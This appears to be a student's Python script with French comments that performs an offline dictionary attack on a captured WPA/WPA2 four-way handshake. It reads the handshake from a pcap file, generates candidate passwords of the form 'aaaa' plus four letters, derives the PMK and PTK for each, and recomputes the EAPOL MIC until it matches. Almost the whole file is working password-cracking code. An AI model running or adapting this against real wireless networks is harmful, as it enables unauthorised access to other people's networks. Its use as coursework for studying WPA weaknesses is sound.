#!/usr/bin/python

from scapy.all import *
from subprocess import *
import hmac,hashlib,binascii,string,itertools,codecs,os,sys
from pbkdf2 import PBKDF2
from scapy_eap import WPA_key 

#générateur du dictionnaire
def genere_dico():
	#Nous avons que l'admin a saisi 4 'a' de suite, donc le pwd est de la forme: aaaa****
	if(os.path.getsize("dictionnaire.txt")==0): #on génère le dico que s'il est vide
		chars='abcdefghijklmnopqrstuvwxyz'
		desc=open("dictionnaire.txt","w")
		for i in itertools.product(chars,repeat=4):
			desc.write("aaaa"+''.join(i)+"\n")
		desc.close()

#calucl de PMK
def PMK(psk,ssid):
	pmk=PBKDF2(psk,ssid,4096)
	return pmk.read(32)
#fct prf
def prf_512(K,A,B):
	R=b''
	A=A.encode('utf-8')
	octe=0
	i=0
	#bytes([octe] nous donne exactement l'octed 0(0x00) dans la chaine b
	while len(R)<64: #parce que 512=64*8
		b=A+bytes([octe])+B+bytes([i])
		mon_hashmac = hmac.new(K,digestmod=hashlib.sha1)
		mon_hashmac.update(b)
		val_hmac = mon_hashmac.digest()
		R+=val_hmac
		i+=1
	return R[:64]# on recupere les 64 premiers caractères de R qui valent 512 bits

#preparation de la donnée B qui sera passée au PRF
def get_B(mac_a,mac_s,nonce_a,nonce_s):
	#conversion en numerique des macs
	mac_s=mac_s.replace(':','')
	mac_s=binascii.a2b_hex(mac_s)#convertir les macs dans le format des nonces afin de pouvoir concatener
	mac_a=mac_a.replace(':','')
	m=mac_a
	mac_a=binascii.a2b_hex(mac_a)
	min_nonce=min(nonce_a,nonce_s)
	max_nonce=max(nonce_a,nonce_s)
	min_mac=min(mac_a,mac_s)
	max_mac=max(mac_s,mac_a)
	return min_mac+max_mac+min_nonce+max_nonce

#Definition de la fonction pricipal d'attaque

def main():
	#Lecture des données de la capture pour avoir des infos connues
	try:
		paquets=rdpcap("capture_wpa.pcap")
	except Exception as e:
		print("Erreur de lecture de la capture wireshark")
		sys.exit(1)

	#génération du dico d'attaque
	genere_dico()

	#******************************************************* RECUPERATION DES DONNÉE NÉCESSAIRE*****************************************************
	ssid=paquets[0].info.decode()
	#Dans la première echange on a adr_mac dst(addr1) et adr_mac src(addr2)
	mac_S=paquets[1].addr1
	mac_A=paquets[1].addr2
	#dans le 2e echange, on a nonce de S
	nonce_S=paquets[2].nonce
	#dans le 3e echange
	nonce_A=paquets[3].nonce
	#mic dans le 4e echange
	A="Pairwise key expansion"
	B= get_B(mac_A,mac_S,nonce_A,nonce_S)
	#*********************************************************************************************************************************************
	#recuperation du d'une copie du paquet, auquel on enlève le mic et essayer de générer un nouveau mic
	paquet=paquets[4][EAPOL]
	MIC=paquet.wpa_key_mic
	#on met à vide le champs mic de notre paquet eapol
	paquet.key_ACK = 0
	#Enlever le mic au paquet EAPOL, en mettant ses 16 octets tous à 0x00 
	paquet.wpa_key_mic=''

	#on deroule l'algoritheme d'attaque donné par le prof(page4 du projet)
	print("***************************************** PATIENTEZ, RECHERCHE DU PASSWORD *********************************************************")
	for l in open("dictionnaire.txt").readlines():
		PTK=prf_512(PMK(l.strip("\n"),ssid),A,B) 
		#on sait que KCK= les 128 premiers bits(16 chars) de TCK
		KCK=PTK[:16]
		#on calcul le mic avec, avec sha1 version wpa2 et md5 version wpa
		if paquets[1].key_descriptor_Version==1:#wpa, donc md5
			mon_hashmac = hmac.new(KCK,digestmod=hashlib.md5)
			mon_hashmac.update(bytes(paquet))
			val_hmac = mon_hashmac.digest()
			if val_hmac==MIC:
				print("Le mic trouvé est: ",val_hmac.hex())
				print("Le mot de passe est: ",l)
				break
			l='' # on met l à vide pour pouvoir tester le cas où on finit le dico sans trouver le bon mdp
		else: #wpa2
			mon_hashmac = hmac.new(KCK,digestmod=hashlib.sha1)
			mon_hashmac.update(bytes(paquet))
			val_hmac = mon_hashmac.digest()
			print(val_hmac)
			if(val_hmac==MIC):
			 	print("Le mic trouvé est: ",val_hmac.hex())
			 	print("Le mot de passe est: ",l)
			 	break
			l=''
	if l=='':
		#Si on finit le dico sans rien trouver, alors le psssword ne se trouve pas dans le dico choisi
		print("Mot de passe non trouvé dans le dictionnaire")
	
main()
